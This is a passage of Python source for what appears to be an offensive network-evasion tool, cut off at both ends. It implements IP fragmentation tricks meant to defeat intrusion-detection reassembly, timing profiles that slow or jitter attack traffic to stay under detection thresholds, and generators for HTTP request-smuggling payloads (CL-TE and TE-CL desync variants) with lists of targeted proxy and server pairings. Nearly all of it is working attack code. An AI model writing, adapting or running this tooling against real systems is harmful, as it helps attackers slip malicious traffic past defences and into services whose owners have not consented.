                    delay_ms=random.uniform(0.1, 2.0),
                    order_index=order_idx,
                )
                fragments.append(frag)
                offset += len(chunk)
                order_idx += 1

            if offset < len(payload):
                # Truncated due to max_fragments; add remainder
                remainder = payload[offset:]
                fragments.append(FragmentSpec(
                    offset=offset, length=len(remainder), data=remainder,
                    more_fragments=False, order_index=order_idx,
                ))

            self._record_fragmentation(
                "tiny_fragment", len(payload), len(fragments)
            )
            logger.debug(
                "Tiny fragment attack: %d bytes -> %d fragments (size=%d)",
                len(payload), len(fragments), fragment_size,
            )
            return fragments

    def reassembly_timeout_exploit(
        self,
        payload: bytes,
        fragment_size: int = 16,
        *,
        timeout_seconds: float = DEFAULT_FRAGMENT_TIMEOUT,
        ids_timeout: float = 30.0,
        server_timeout: float = 120.0,
    ) -> List[FragmentSpec]:
        """
        Exploit fragment reassembly timeout differences between IDS and target.

        If the IDS has a shorter reassembly timeout than the target server,
        fragments can be sent with delays that cause the IDS to drop the
        reassembly context while the server still reassembles correctly.

        Strategy: Send first fragments quickly, then delay remaining fragments
        just past the IDS timeout but within the server timeout.

        Args:
            payload: Raw payload to fragment.
            fragment_size: Size of each fragment.
            timeout_seconds: Desired delay between fragment groups.
            ids_timeout: Known/estimated IDS reassembly timeout.
            server_timeout: Known/estimated server reassembly timeout.

        Returns:
            List of FragmentSpec objects with calculated delays.
        """
        with self._lock:
            if not payload:
                return []

            # Calculate optimal delay: just past IDS timeout, within server timeout
            optimal_delay_ms = (ids_timeout + 1.0) * 1000.0
            if optimal_delay_ms / 1000.0 >= server_timeout:
                # Cannot exploit if server timeout <= IDS timeout
                optimal_delay_ms = (server_timeout * 0.8) * 1000.0

            fragment_size = max(8, fragment_size)
            fragments: List[FragmentSpec] = []
            offset = 0
            order_idx = 0
            midpoint = len(payload) // 2

            while offset < len(payload):
                chunk = payload[offset:offset + fragment_size]
                remaining = len(payload) - offset - len(chunk)

                # Apply delay after first half of fragments
                delay = 0.0
                if offset >= midpoint and offset - fragment_size < midpoint:
                    delay = optimal_delay_ms

                frag = FragmentSpec(
                    offset=offset,
                    length=len(chunk),
                    data=chunk,
                    more_fragments=remaining > 0,
                    ttl=64,
                    delay_ms=delay,
                    order_index=order_idx,
                )
                fragments.append(frag)
                offset += len(chunk)
                order_idx += 1

            self._record_fragmentation(
                "reassembly_timeout", len(payload), len(fragments)
            )
            logger.debug(
                "Reassembly timeout exploit: %d bytes -> %d fragments, "
                "delay=%.1fms (ids_timeout=%.1fs, srv_timeout=%.1fs)",
                len(payload), len(fragments), optimal_delay_ms,
                ids_timeout, server_timeout,
            )
            return fragments

    def out_of_order_delivery(
        self,
        payload: bytes,
        fragment_size: int = 16,
        *,
        shuffle_mode: str = "random",
    ) -> List[FragmentSpec]:
        """
        Send fragments in non-sequential order.

        Some IDS implementations expect fragments in order and may fail
        to properly reassemble out-of-order fragments, or may not buffer
        them correctly for signature matching.

        Shuffle modes:
            - 'random': Fully random order
            - 'reverse': Send fragments in reverse order
            - 'interleave': Alternate between beginning and end
            - 'last_first': Send last fragment first, then rest in order

        Args:
            payload: Raw payload to fragment.
            fragment_size: Size of each fragment.
            shuffle_mode: How to reorder fragments.

        Returns:
            List of FragmentSpec objects in non-sequential order.
        """
        with self._lock:
            if not payload:
                return []

            # First create in-order fragments
            fragment_size = max(8, fragment_size)
            ordered: List[FragmentSpec] = []
            offset = 0
            order_idx = 0

            while offset < len(payload):
                chunk = payload[offset:offset + fragment_size]
                remaining = len(payload) - offset - len(chunk)
                frag = FragmentSpec(
                    offset=offset, length=len(chunk), data=chunk,
                    more_fragments=remaining > 0, order_index=order_idx,
                )
                ordered.append(frag)
                offset += len(chunk)
                order_idx += 1

            # Reorder based on shuffle mode
            if shuffle_mode == "reverse":
                reordered = list(reversed(ordered))
            elif shuffle_mode == "interleave":
                reordered = []
                left, right = 0, len(ordered) - 1
                toggle = True
                while left <= right:
                    if toggle:
                        reordered.append(ordered[left])
                        left += 1
                    else:
                        reordered.append(ordered[right])
                        right -= 1
                    toggle = not toggle
            elif shuffle_mode == "last_first":
                if len(ordered) > 1:
                    reordered = [ordered[-1]] + ordered[:-1]
                else:
                    reordered = ordered[:]
            else:  # random
                reordered = ordered[:]
                random.shuffle(reordered)

            # Add small delays between fragments
            for i, frag in enumerate(reordered):
                frag.delay_ms = random.uniform(1.0, 50.0) if i > 0 else 0.0

            self._record_fragmentation(
                "out_of_order", len(payload), len(reordered)
            )
            logger.debug(
                "Out-of-order delivery: %d bytes -> %d fragments, mode=%s",
                len(payload), len(reordered), shuffle_mode,
            )
            return reordered

    def mtu_manipulation(
        self,
        payload: bytes,
        fake_mtu: int = 68,
        *,
        path_mtu_discovery: bool = True,
    ) -> List[FragmentSpec]:
        """
        Manipulate apparent MTU to force fragmentation at specific sizes.

        By advertising a very small MTU (e.g., 68 bytes, the minimum IPv4 MTU),
        the target's TCP stack may generate very small segments that are harder
        for the IDS to reassemble.

        The minimum IPv4 MTU is 68 bytes (20 IP header + 8 min data or 20 IP +
        20 TCP + 8 data for path MTU discovery).

        Args:
            payload: Raw payload to fragment.
            fake_mtu: Fake MTU value to use for fragmentation calculation.
            path_mtu_discovery: Simulate PMTUD-based fragmentation.

        Returns:
            List of FragmentSpec objects sized according to fake MTU.
        """
        with self._lock:
            if not payload:
                return []

            # Calculate effective fragment size from MTU
            # IP header = 20 bytes, TCP header = 20 bytes (minimum)
            ip_header = 20
            tcp_header = 20
            if path_mtu_discovery:
                effective_payload = max(1, fake_mtu - ip_header - tcp_header)
            else:
                effective_payload = max(8, fake_mtu - ip_header)

            fragments: List[FragmentSpec] = []
            offset = 0
            order_idx = 0

            while offset < len(payload):
                chunk = payload[offset:offset + effective_payload]
                remaining = len(payload) - offset - len(chunk)

                frag = FragmentSpec(
                    offset=offset,
                    length=len(chunk),
                    data=chunk,
                    more_fragments=remaining > 0,
                    ttl=64,
                    delay_ms=0.0,
                    order_index=order_idx,
                )
                fragments.append(frag)
                offset += len(chunk)
                order_idx += 1

            self._record_fragmentation(
                "mtu_manipulation", len(payload), len(fragments)
            )
            logger.debug(
                "MTU manipulation: %d bytes -> %d fragments (mtu=%d, effective=%d)",
                len(payload), len(fragments), fake_mtu, effective_payload,
            )
            return fragments

    def duplicate_fragment_attack(
        self,
        payload: bytes,
        fragment_size: int = 16,
        *,
        duplicate_indices: Optional[List[int]] = None,
        corrupt_duplicates: bool = False,
    ) -> List[FragmentSpec]:
        """
        Send duplicate fragments to confuse IDS fragment tracking.

        Some IDS implementations may handle duplicate fragments poorly,
        potentially causing them to miscount or misalign reassembly.

        Args:
            payload: Raw payload to fragment.
            fragment_size: Size of each fragment.
            duplicate_indices: Which fragment indices to duplicate. If None,
                duplicates all fragments.
            corrupt_duplicates: If True, alter data in duplicate fragments.

        Returns:
            List of FragmentSpec objects including duplicates.
        """
        with self._lock:
            if not payload:
                return []

            fragment_size = max(8, fragment_size)
            base_fragments: List[FragmentSpec] = []
            offset = 0
            order_idx = 0

            while offset < len(payload):
                chunk = payload[offset:offset + fragment_size]
                remaining = len(payload) - offset - len(chunk)
                frag = FragmentSpec(
                    offset=offset, length=len(chunk), data=chunk,
                    more_fragments=remaining > 0, order_index=order_idx,
                )
                base_fragments.append(frag)
                offset += len(chunk)
                order_idx += 1

            if duplicate_indices is None:
                duplicate_indices = list(range(len(base_fragments)))

            result: List[FragmentSpec] = []
            for i, frag in enumerate(base_fragments):
                result.append(frag)
                if i in duplicate_indices:
                    dup = FragmentSpec(
                        offset=frag.offset,
                        length=frag.length,
                        data=frag.data if not corrupt_duplicates else bytes(
                            b ^ random.randint(1, 255) for b in frag.data
                        ),
                        more_fragments=frag.more_fragments,
                        duplicate=True,
                        delay_ms=random.uniform(5.0, 50.0),
                        order_index=frag.order_index,
                    )
                    result.append(dup)

            self._record_fragmentation(
                "duplicate_fragment", len(payload), len(result)
            )
            logger.debug(
                "Duplicate fragment attack: %d bytes -> %d fragments "
                "(base=%d, duplicates=%d)",
                len(payload), len(result), len(base_fragments),
                len(result) - len(base_fragments),
            )
            return result

    def interleaved_fragment_attack(
        self,
        payload_a: bytes,
        payload_b: bytes,
        fragment_size: int = 16,
    ) -> Tuple[List[FragmentSpec], List[FragmentSpec]]:
        """
        Interleave fragments from two different payloads.

        By sending fragments from two different IP identification values
        interleaved, the IDS must track multiple reassembly contexts
        simultaneously, potentially exceeding its tracking capacity.

        Args:
            payload_a: First payload (attack).
            payload_b: Second payload (decoy or second attack).
            fragment_size: Size of each fragment.

        Returns:
            Tuple of two fragment lists, interleaved for sending.
        """
        with self._lock:
            frags_a = self.ip_fragment(payload_a, fragment_size)
            frags_b = self.ip_fragment(payload_b, fragment_size)

            # Interleave: A[0], B[0], A[1], B[1], ...
            interleaved_a: List[FragmentSpec] = []
            interleaved_b: List[FragmentSpec] = []
            max_len = max(len(frags_a), len(frags_b))

            for i in range(max_len):
                if i < len(frags_a):
                    frags_a[i].delay_ms = random.uniform(1.0, 10.0)
                    interleaved_a.append(frags_a[i])
                if i < len(frags_b):
                    frags_b[i].delay_ms = random.uniform(1.0, 10.0)
                    interleaved_b.append(frags_b[i])

            logger.debug(
                "Interleaved fragment attack: A=%d frags, B=%d frags",
                len(interleaved_a), len(interleaved_b),
            )
            return interleaved_a, interleaved_b

    def get_strategy_stats(self) -> Dict[str, Dict[str, int]]:
        """Return fragmentation strategy usage statistics."""
        with self._lock:
            return dict(self._strategy_stats)

    def _record_fragmentation(
        self, strategy: str, payload_size: int, fragment_count: int
    ) -> None:
        """Record a fragmentation operation for statistics."""
        self._strategy_stats[strategy]["attempts"] += 1
        self._fragment_history.append({
            "strategy": strategy,
            "payload_size": payload_size,
            "fragment_count": fragment_count,
            "timestamp": time.time(),
        })

    def to_dict(self) -> Dict[str, Any]:
        """Serialize fragmenter state."""
        with self._lock:
            return {
                "fragment_counter": self._fragment_counter,
                "strategy_stats": dict(self._strategy_stats),
                "history_size": len(self._fragment_history),
            }


# ════════════════════════════════════════════════════════════════════════════════
# TIMING EVADER
# ════════════════════════════════════════════════════════════════════════════════

class TimingEvader:
    """
    Timing-based IDS evasion engine.

    Controls the timing of attack traffic to avoid triggering rate-based
    and frequency-based IDS rules. Supports multiple timing profiles
    from paranoid (extremely slow) to aggressive (maximum speed).

    Usage:
        evader = TimingEvader(strategy=TimingStrategy.SNEAKY)
        delay = evader.get_next_delay()
        time.sleep(delay)
        schedule = evader.generate_schedule(num_requests=100)
        evader.set_burst_pause(burst_size=5, pause_duration=30.0)
    """

    def __init__(
        self,
        strategy: TimingStrategy = TimingStrategy.POLITE,
        *,
        jitter_range: Tuple[float, float] = DEFAULT_JITTER_RANGE,
        burst_size: int = DEFAULT_BURST_SIZE,
        pause_duration: float = DEFAULT_PAUSE_DURATION,
    ) -> None:
        self._lock = threading.RLock()
        self._strategy = strategy
        self._jitter_range = jitter_range
        self._burst_size = burst_size
        self._pause_duration = pause_duration
        self._request_count: int = 0
        self._burst_counter: int = 0
        self._last_request_time: float = 0.0
        self._schedule_history: Deque[float] = deque(maxlen=10000)
        self._active_hours: List[Tuple[int, int]] = [(9, 17)]  # 9 AM - 5 PM
        self._connection_rate_limit: float = 0.0
        self._detected_threshold: Optional[float] = None

        # Strategy-specific timing parameters (seconds)
        self._strategy_delays: Dict[TimingStrategy, Tuple[float, float]] = {
            TimingStrategy.PARANOID: (240.0, 360.0),
            TimingStrategy.SNEAKY: (15.0, 30.0),
            TimingStrategy.POLITE: (2.0, 5.0),
            TimingStrategy.NORMAL: (0.1, 0.5),
            TimingStrategy.AGGRESSIVE: (0.0, 0.05),
            TimingStrategy.SLOW_RATE: (50.0, 70.0),
            TimingStrategy.RANDOM_JITTER: (0.5, 60.0),
            TimingStrategy.BURST_PAUSE: (0.05, 0.2),
            TimingStrategy.TIME_OF_DAY: (1.0, 5.0),
        }

        logger.info(
            "TimingEvader initialized: strategy=%s, jitter=%s",
            strategy.name, jitter_range,
        )

    @property
    def strategy(self) -> TimingStrategy:
        """Current timing strategy."""
        return self._strategy

    @strategy.setter
    def strategy(self, value: TimingStrategy) -> None:
        with self._lock:
            self._strategy = value
            self._burst_counter = 0
            logger.info("Timing strategy changed to %s", value.name)

    def get_next_delay(self) -> float:
        """
        Calculate the next delay in seconds based on the current strategy.

        Returns:
            Float number of seconds to wait before the next request.
        """
        with self._lock:
            self._request_count += 1
            now = time.time()

            if self._strategy == TimingStrategy.BURST_PAUSE:
                delay = self._calculate_burst_pause_delay()
            elif self._strategy == TimingStrategy.TIME_OF_DAY:
                delay = self._calculate_time_of_day_delay(now)
            elif self._strategy == TimingStrategy.RANDOM_JITTER:
                delay = self._calculate_random_jitter_delay()
            else:
                min_delay, max_delay = self._strategy_delays.get(
                    self._strategy, (1.0, 3.0)
                )
                delay = random.uniform(min_delay, max_delay)

            # Apply connection rate limit if detected
            if self._connection_rate_limit > 0:
                min_interval = 1.0 / self._connection_rate_limit
                delay = max(delay, min_interval)

            # Apply jitter
            jitter = random.uniform(
                -self._jitter_range[0] * 0.1,
                self._jitter_range[1] * 0.1,
            )
            delay = max(0.0, delay + jitter)

            self._last_request_time = now
            self._schedule_history.append(delay)

            return delay

    def generate_schedule(
        self,
        num_requests: int,
        *,
        start_time: Optional[float] = None,
    ) -> List[Dict[str, Any]]:
        """
        Pre-generate a complete timing schedule for N requests.

        Args:
            num_requests: Number of requests to schedule.
            start_time: Unix timestamp for first request. Defaults to now.

        Returns:
            List of dicts with 'request_index', 'timestamp', 'delay_seconds'.
        """
        with self._lock:
            if start_time is None:
                start_time = time.time()

            schedule: List[Dict[str, Any]] = []
            current_time = start_time

            for i in range(num_requests):
                delay = self.get_next_delay()
                current_time += delay
                schedule.append({
                    "request_index": i,
                    "timestamp": current_time,
                    "delay_seconds": delay,
                    "strategy": self._strategy.name,
                    "human_time": time.strftime(
                        "%Y-%m-%d %H:%M:%S",
                        time.localtime(current_time),
                    ),
                })

            total_duration = current_time - start_time
            logger.info(
                "Generated schedule: %d requests over %.1f seconds (%.1f min)",
                num_requests, total_duration, total_duration / 60.0,
            )
            return schedule

    def set_burst_pause(
        self,
        burst_size: int = DEFAULT_BURST_SIZE,
        pause_duration: float = DEFAULT_PAUSE_DURATION,
    ) -> None:
        """
        Configure burst-then-pause timing pattern.

        Args:
            burst_size: Number of rapid requests per burst.
            pause_duration: Seconds to pause between bursts.
        """
        with self._lock:
            self._burst_size = max(1, burst_size)
            self._pause_duration = max(1.0, pause_duration)
            self._burst_counter = 0
            logger.info(
                "Burst-pause configured: burst=%d, pause=%.1fs",
                self._burst_size, self._pause_duration,
            )

    def set_active_hours(self, hours: List[Tuple[int, int]]) -> None:
        """
        Set active hours for time-of-day strategy.

        Args:
            hours: List of (start_hour, end_hour) tuples in 24h format.
        """
        with self._lock:
            self._active_hours = [
                (max(0, min(23, s)), max(0, min(23, e))) for s, e in hours
            ]
            logger.info("Active hours set: %s", self._active_hours)

    def set_connection_rate_limit(self, max_connections_per_second: float) -> None:
        """
        Set awareness of detected connection rate limiting.

        If the target or IDS is known to rate-limit connections, this
        ensures delays respect that threshold.

        Args:
            max_connections_per_second: Maximum safe connection rate.
        """
        with self._lock:
            self._connection_rate_limit = max(0.0, max_connections_per_second)
            logger.info(
                "Connection rate limit awareness: %.2f conn/s",
                self._connection_rate_limit,
            )

    def get_scan_timing_profile(self, profile_name: str) -> Dict[str, Any]:
        """
        Get predefined scan timing profiles (nmap-style).

        Profiles:
            - paranoid (T0): 5 min between probes, serial scan
            - sneaky (T1): 15s between probes, serial scan
            - polite (T2): 0.4s between probes, serial scan
            - normal (T3): Parallel, dynamic timing
            - aggressive (T4): 10ms timeout, parallel
            - insane (T5): 5ms timeout, max parallel (not recommended)

        Args:
            profile_name: One of 'paranoid', 'sneaky', 'polite', 'normal',
                         'aggressive', 'insane'.

        Returns:
            Dict with timing parameters for the profile.
        """
        profiles: Dict[str, Dict[str, Any]] = {
            "paranoid": {
                "name": "T0 - Paranoid",
                "probe_delay_ms": 300000,
                "max_parallelism": 1,
                "host_timeout_ms": 0,
                "max_retries": 10,
                "initial_rtt_timeout_ms": 300000,
                "max_rtt_timeout_ms": 300000,
                "min_rtt_timeout_ms": 100000,
                "scan_delay_ms": 300000,
                "max_scan_delay_ms": 300000,
                "description": "Extremely slow, serial, minimal detection risk",
            },
            "sneaky": {
                "name": "T1 - Sneaky",
                "probe_delay_ms": 15000,
                "max_parallelism": 1,
                "host_timeout_ms": 0,
                "max_retries": 10,
                "initial_rtt_timeout_ms": 15000,
                "max_rtt_timeout_ms": 15000,
                "min_rtt_timeout_ms": 100,
                "scan_delay_ms": 15000,
                "max_scan_delay_ms": 15000,
                "description": "Slow serial scan, low detection risk",
            },
            "polite": {
                "name": "T2 - Polite",
                "probe_delay_ms": 400,
                "max_parallelism": 1,
                "host_timeout_ms": 0,
                "max_retries": 10,
                "initial_rtt_timeout_ms": 1000,
                "max_rtt_timeout_ms": 10000,
                "min_rtt_timeout_ms": 100,
                "scan_delay_ms": 400,
                "max_scan_delay_ms": 400,
                "description": "Respectful timing, serial, low network impact",
            },
            "normal": {
                "name": "T3 - Normal",
                "probe_delay_ms": 0,
                "max_parallelism": 0,
                "host_timeout_ms": 0,
                "max_retries": 10,
                "initial_rtt_timeout_ms": 1000,
                "max_rtt_timeout_ms": 10000,
                "min_rtt_timeout_ms": 100,
                "scan_delay_ms": 0,
                "max_scan_delay_ms": 1000,
                "description": "Default dynamic timing, parallel probes",
            },
            "aggressive": {
                "name": "T4 - Aggressive",
                "probe_delay_ms": 0,
                "max_parallelism": 0,
                "host_timeout_ms": 300000,
                "max_retries": 6,
                "initial_rtt_timeout_ms": 500,
                "max_rtt_timeout_ms": 1250,
                "min_rtt_timeout_ms": 100,
                "scan_delay_ms": 0,
                "max_scan_delay_ms": 10,
                "description": "Fast parallel scan, higher detection risk",
            },
            "insane": {
                "name": "T5 - Insane",
                "probe_delay_ms": 0,
                "max_parallelism": 0,
                "host_timeout_ms": 900000,
                "max_retries": 2,
                "initial_rtt_timeout_ms": 250,
                "max_rtt_timeout_ms": 300,
                "min_rtt_timeout_ms": 50,
                "scan_delay_ms": 0,
                "max_scan_delay_ms": 5,
                "description": "Maximum speed, very high detection risk",
            },
        }

        profile_name = profile_name.lower()
        if profile_name not in profiles:
            logger.warning("Unknown profile '%s', using 'normal'", profile_name)
            profile_name = "normal"

        return profiles[profile_name]

    def estimate_total_time(
        self,
        num_requests: int,
    ) -> Dict[str, float]:
        """
        Estimate total time for N requests under current strategy.

        Args:
            num_requests: Number of requests to estimate for.

        Returns:
            Dict with 'min_seconds', 'max_seconds', 'avg_seconds',
            'min_minutes', 'max_minutes', 'avg_minutes'.
        """
        with self._lock:
            min_delay, max_delay = self._strategy_delays.get(
                self._strategy, (1.0, 3.0)
            )
            avg_delay = (min_delay + max_delay) / 2.0

            # Account for burst-pause
            if self._strategy == TimingStrategy.BURST_PAUSE:
                bursts = num_requests / max(1, self._burst_size)
                min_total = bursts * self._pause_duration * 0.5
                max_total = bursts * self._pause_duration * 1.5
                avg_total = bursts * self._pause_duration
            else:
                min_total = num_requests * min_delay
                max_total = num_requests * max_delay
                avg_total = num_requests * avg_delay

            return {
                "min_seconds": min_total,
                "max_seconds": max_total,
                "avg_seconds": avg_total,
                "min_minutes": min_total / 60.0,
                "max_minutes": max_total / 60.0,
                "avg_minutes": avg_total / 60.0,
                "strategy": self._strategy.name,
                "num_requests": num_requests,
            }

    def _calculate_burst_pause_delay(self) -> float:
        """Calculate delay for burst-then-pause pattern."""
        self._burst_counter += 1
        if self._burst_counter >= self._burst_size:
            self._burst_counter = 0
            # Add randomness to pause duration (+-20%)
            jitter_factor = random.uniform(0.8, 1.2)
            return self._pause_duration * jitter_factor
        else:
            # Within a burst: minimal delay
            return random.uniform(0.01, 0.1)

    def _calculate_time_of_day_delay(self, now: float) -> float:
        """Calculate delay for time-of-day strategy."""
        current_hour = int(time.strftime("%H", time.localtime(now)))

        is_active = False
        for start_h, end_h in self._active_hours:
            if start_h <= end_h:
                if start_h <= current_hour < end_h:
                    is_active = True
                    break
            else:
                # Wrap around midnight (e.g., 22-6)
                if current_hour >= start_h or current_hour < end_h:
                    is_active = True
                    break

        if is_active:
            # During active hours: normal-ish timing blended with traffic
            return random.uniform(1.0, 5.0)
        else:
            # Outside active hours: very slow or wait until active
            # Calculate seconds until next active period
            for start_h, _ in self._active_hours:
                if start_h > current_hour:
                    wait_hours = start_h - current_hour
                    # Don't actually wait hours; just slow down significantly
                    return random.uniform(60.0, 300.0)

            # Default: slow rate
            return random.uniform(60.0, 180.0)

    def _calculate_random_jitter_delay(self) -> float:
        """Calculate delay with random jitter pattern."""
        # Use a distribution that's heavier on shorter delays
        # (exponential-like) to appear more natural
        base = random.expovariate(0.1)  # Mean = 10 seconds
        return max(self._jitter_range[0], min(self._jitter_range[1] * 10, base))

    def get_request_stats(self) -> Dict[str, Any]:
        """Return timing statistics."""
        with self._lock:
            delays = list(self._schedule_history)
            if not delays:
                return {
                    "total_requests": self._request_count,
                    "strategy": self._strategy.name,
                }

            return {
                "total_requests": self._request_count,
                "strategy": self._strategy.name,
                "min_delay": min(delays),
                "max_delay": max(delays),
                "avg_delay": sum(delays) / len(delays),
                "total_delay": sum(delays),
                "history_size": len(delays),
            }

    def to_dict(self) -> Dict[str, Any]:
        """Serialize evader state."""
        with self._lock:
            return {
                "strategy": self._strategy.name,
                "jitter_range": list(self._jitter_range),
                "burst_size": self._burst_size,
                "pause_duration": self._pause_duration,
                "request_count": self._request_count,
                "active_hours": self._active_hours,
                "connection_rate_limit": self._connection_rate_limit,
                "stats": self.get_request_stats(),
            }


# ════════════════════════════════════════════════════════════════════════════════
# PROTOCOL ABUSER
# ════════════════════════════════════════════════════════════════════════════════

class ProtocolAbuser:
    """
    Protocol-level IDS evasion through HTTP desync, smuggling, and abuse.

    Exploits differences in how front-end proxies, IDS systems, and back-end
    servers parse HTTP to smuggle malicious requests past inspection.

    Usage:
        abuser = ProtocolAbuser()
        payloads = abuser.generate_cl_te_desync(smuggled_request)
        payloads = abuser.generate_te_cl_desync(smuggled_request)
        payloads = abuser.generate_te_te_desync(smuggled_request)
        payloads = abuser.generate_smuggling_payloads(target_path)
        payloads = abuser.chunked_encoding_abuse(body)
        payloads = abuser.http2_downgrade_attack(request)
        payloads = abuser.http_pipelining_abuse(requests_list)
        payloads = abuser.websocket_upgrade_hijack(target_path)
        payloads = abuser.verb_tampering(original_method, path)
    """

    def __init__(self) -> None:
        self._lock = threading.RLock()
        self._generated_payloads: Deque[Dict[str, Any]] = deque(maxlen=500)
        self._technique_stats: Dict[str, Dict[str, int]] = defaultdict(
            lambda: {"generated": 0, "successful": 0}
        )
        self._smuggle_counter: int = 0
        logger.info("ProtocolAbuser initialized")

    def generate_cl_te_desync(
        self,
        smuggled_request: str,
        *,
        host: str = "target.com",
        front_path: str = "/",
    ) -> List[SmugglePayload]:
        """
        Generate CL-TE HTTP desync payloads.

        In CL-TE desync, the front-end uses Content-Length while the back-end
        uses Transfer-Encoding. The front-end forwards the full request based
        on Content-Length, but the back-end processes the chunked body and
        treats the remainder as a new request.

        Args:
            smuggled_request: The HTTP request to smuggle.
            host: Target host header value.
            front_path: Path for the front-end request.

        Returns:
            List of SmugglePayload objects with CL-TE variations.
        """
        with self._lock:
            payloads: List[SmugglePayload] = []

            # Variation 1: Basic CL-TE
            chunked_body = f"0\r\n\r\n{smuggled_request}"
            front_end = (
                f"POST {front_path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Length: {len(chunked_body)}\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"{chunked_body}"
            )
            payloads.append(SmugglePayload(
                technique="CL-TE Basic",
                front_end_request=front_end,
                back_end_request=smuggled_request,
                smuggled_content=smuggled_request,
                content_length=len(chunked_body),
                transfer_encoding="chunked",
                description="Basic CL-TE: front uses CL, back uses TE",
                target_servers=["nginx+gunicorn", "haproxy+apache"],
            ))

            # Variation 2: CL-TE with body padding
            padding = "X" * 64
            padded_body = f"0\r\n\r\n{smuggled_request}"
            front_end_padded = (
                f"POST {front_path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Length: {len(padded_body) + len(padding)}\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"X-Padding: {padding}\r\n"
                f"\r\n"
                f"{padded_body}"
            )
            payloads.append(SmugglePayload(
                technique="CL-TE Padded",
                front_end_request=front_end_padded,
                back_end_request=smuggled_request,
                smuggled_content=smuggled_request,
                content_length=len(padded_body) + len(padding),
                transfer_encoding="chunked",
                description="CL-TE with header padding to confuse length calc",
                target_servers=["nginx+gunicorn", "cdn+origin"],
            ))

            # Variation 3: CL-TE with tab in Transfer-Encoding
            tab_body = f"0\r\n\r\n{smuggled_request}"
            front_end_tab = (
                f"POST {front_path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Length: {len(tab_body)}\r\n"
                f"Transfer-Encoding:\tchunked\r\n"
                f"\r\n"
                f"{tab_body}"
            )
            payloads.append(SmugglePayload(
                technique="CL-TE Tab TE",
                front_end_request=front_end_tab,
                back_end_request=smuggled_request,
                smuggled_content=smuggled_request,
                content_length=len(tab_body),
                transfer_encoding="chunked",
                description="CL-TE with tab before 'chunked' value",
                target_servers=["varnish+apache", "squid+nginx"],
            ))

            # Variation 4: CL-TE with duplicate Content-Length
            dup_body = f"0\r\n\r\n{smuggled_request}"
            front_end_dup = (
                f"POST {front_path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Length: {len(dup_body)}\r\n"
                f"Content-Length: 0\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"{dup_body}"
            )
            payloads.append(SmugglePayload(
                technique="CL-TE Duplicate CL",
                front_end_request=front_end_dup,
                back_end_request=smuggled_request,
                smuggled_content=smuggled_request,
                content_length=len(dup_body),
                transfer_encoding="chunked",
                description="CL-TE with duplicate Content-Length headers",
                target_servers=["apache+tomcat", "nginx+node"],
            ))

            self._smuggle_counter += len(payloads)
            self._technique_stats["cl_te"]["generated"] += len(payloads)
            self._record_generation("cl_te_desync", len(payloads))

            logger.debug(
                "Generated %d CL-TE desync payloads for host=%s",
                len(payloads), host,
            )
            return payloads

    def generate_te_cl_desync(
        self,
        smuggled_request: str,
        *,
        host: str = "target.com",
        front_path: str = "/",
    ) -> List[SmugglePayload]:
        """
        Generate TE-CL HTTP desync payloads.

        In TE-CL desync, the front-end uses Transfer-Encoding while the
        back-end uses Content-Length. The front-end processes the chunked
        encoding, but the back-end reads only Content-Length bytes and
        treats the rest as a new request.

        Args:
            smuggled_request: The HTTP request to smuggle.
            host: Target host header value.
            front_path: Path for the front-end request.

        Returns:
            List of SmugglePayload objects with TE-CL variations.
        """
        with self._lock:
            payloads: List[SmugglePayload] = []
            smuggled_hex_len = hex(len(smuggled_request))[2:]

            # Variation 1: Basic TE-CL
            body = (
                f"{smuggled_hex_len}\r\n"
                f"{smuggled_request}\r\n"
                f"0\r\n"
                f"\r\n"
            )
            front_end = (
                f"POST {front_path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Length: 4\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"{body}"
            )
            payloads.append(SmugglePayload(
                technique="TE-CL Basic",
                front_end_request=front_end,
                back_end_request=smuggled_request,
                smuggled_content=smuggled_request,
                content_length=4,
                transfer_encoding="chunked",
                description="Basic TE-CL: front uses TE, back uses CL",
                target_servers=["apache+nginx", "haproxy+gunicorn"],
            ))

            # Variation 2: TE-CL with zero Content-Length
            body_zero = (
                f"{smuggled_hex_len}\r\n"
                f"{smuggled_request}\r\n"
                f"0\r\n"
                f"\r\n"
            )
            front_end_zero = (
                f"POST {front_path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Length: 0\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"{body_zero}"
            )
            payloads.append(SmugglePayload(
                technique="TE-CL Zero CL",
                front_end_request=front_end_zero,
                back_end_request=smuggled_request,
                smuggled_content=smuggled_request,
                content_length=0,
                transfer_encoding="chunked",
                description="TE-CL with Content-Length: 0",
                target_servers=["cloudflare+origin", "akamai+apache"],
            ))

            # Variation 3: TE-CL with large Content-Length
            body_large = (
                f"{smuggled_hex_len}\r\n"
                f"{smuggled_request}\r\n"
                f"0\r\n"
                f"\r\n"
            )
            front_end_large = (
                f"POST {front_path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Length: 999999\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"{body_large}"
            )
            payloads.append(SmugglePayload(
                technique="TE-CL Large CL",
                front_end_request=front_end_large,
                back_end_request=smuggled_request,
                smuggled_content=smuggled_request,
                content_length=999999,
                transfer_encoding="chunked",
                description="TE-CL with extremely large Content-Length",
                target_servers=["aws_alb+backend", "gcp_lb+backend"],
            ))

            self._smuggle_counter += len(payloads)
            self._technique_stats["te_cl"]["generated"] += len(payloads)
            self._record_generation("te_cl_desync", len(payloads))

            logger.debug(
                "Generated %d TE-CL desync payloads for host=%s",
                len(payloads), host,
            )
            return payloads

    def generate_te_te_desync(
        self,
        smuggled_request: str,
        *,
        host: str = "target.com",
        front_path: str = "/",
    ) -> List[SmugglePayload]:
        """
        Generate TE-TE HTTP desync payloads.

        Both front-end and back-end use Transfer-Encoding, but one can be
        tricked into not processing it by obfuscating the header value.
        Many obfuscation techniques exist for the 'chunked' value.

        Args:
            smuggled_request: The HTTP request to smuggle.
            host: Target host header value.
            front_path: Path for the front-end request.

        Returns:
            List of SmugglePayload objects with TE-TE obfuscation variations.
        """
        with self._lock:
            payloads: List[SmugglePayload] = []
